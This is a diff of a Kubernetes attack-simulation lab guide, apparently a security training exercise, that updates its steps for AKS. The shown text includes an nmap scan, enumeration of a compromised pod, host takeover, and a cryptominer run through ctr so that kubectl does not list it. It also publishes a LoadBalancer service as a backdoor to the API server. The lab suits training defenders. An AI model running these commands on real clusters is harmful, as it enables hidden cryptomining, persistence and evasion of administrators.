@@ -21,12 +21,7 @@
 
 Seeing that the URL included port `31337` and that __Red__ said it was a Kubernetes `cluster`, it was likely to be exposed via a `NodePort` `service`. With this information, she has a feeling that more `services` might still be exposed to the web this way. __DarkRed__ starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via `nmap`.
 
-To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.
-
-Your Cloud Shell has a little script to help:
-```console
-./attack-2-helper.sh
-```
+To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to "nmap -sT -A -T4 -n -v -Pn your-ip-address-goes-here". Be absolutely sure to scan your assigned IP address.
 
 This scan confirms __DarkRed's__ suspicion that more services were present in this `cluster`. They all look like webservers, so explore them briefly with your browser.
 
@@ -47,18 +42,22 @@ Your Cloud Shell has a little script to help:
 Run a few commands to make sure it's working and gather some basic information:
 
 ```console
-id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
+id; uname -a; cat /etc/lsb-release; ps -ef; env | grep -i kube
 ```
 
 Review the information. Check for Kubernetes access, and find the limits of our permissions:
 
 ```console
 export PATH=/tmp:$PATH
-cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl
+cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl 
 kubectl get pods
 kubectl get pods --all-namespaces
 kubectl get nodes
 kubectl auth can-i --list
+kubectl auth can-i create pods
+kubectl auth can-i create pods -n dev
+kubectl auth can-i create pods -n prd
+kubectl auth can-i create pods -n kube-system
 ```
 
 Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims.
@@ -81,20 +80,29 @@ Convince yourself that you're really on the host, using some of our earlier enum
 id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube
 ```
 
-It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands like `docker ps` directly.  By deploying our bitcoinero container via Docker on the host, it will show up in a `docker ps` listing.  However, Docker is managing the container directly and not the `kubelet`, so the malicious container _won't show up in a `kubectl get pods`_ listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.
+It's been said that "if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong", so it's unlikely that cluster administrators are SSHing into nodes and running commands directly.  
 
-First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.
+AKS doesn't use Docker, so instead we'll need to use `crictl` instead.  By deploying our bitcoinero container via Docker on the host, it will show up in a `crictl ps` listing.  However, containerd is managing the container directly and not the `kubelet`, so the malicious container _won't show up in a `kubectl get pods`_ listing.  Without additional detection capabilities, it's likely that the cluster administrator will never even notice.
+
+First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running.  For this, we will use `ctr`, the containerd CLI.
 
 ```console
-docker ps
+ctr containers ls
 ```
 
 ```console
-docker run -d securekubernetes/bitcoinero -c1 -l10
+# ctr does not auto-pull images
+ctr images pull docker.io/securekubernetes/bitcoinero:latest
+
+ctr run -d docker.io/securekubernetes/bitcoinero:latest bitcoinero "/moneymoneymoney" "-c 1 -l 10"
 ```
 
 ```console
-docker container ls
+# Verify the container is running
+ctr container ls
+
+# Verify the container doesn't show up in the pod list
+kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A
 ```
 
 ## Digging In
@@ -134,17 +142,15 @@ kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES
 Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future:
 
 ```console
-cat <<EOF | kubectl --token "$TOKEN" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f -
+cat <<EOF | kubectl --kubeconfig /var/lib/kubelet/kubeconfig apply -f -
 apiVersion: v1
 kind: Service
 metadata:
   name: istio-mgmt
-  namespace: kube-system
 spec:
-  type: NodePort
+  type: LoadBalancer
   ports:
     - protocol: TCP
-      nodePort: 31313
       port: 31313
       targetPort: $KUBERNETES_SERVICE_PORT
 ---
@@ -152,7 +158,6 @@ apiVersion: v1
 kind: Endpoints
 metadata:
   name: istio-mgmt
-  namespace: kube-system
 subsets:
   - addresses:
       - ip: `sed -n 's/^  *server: https:\/\///p' /var/lib/kubelet/kubeconfig`
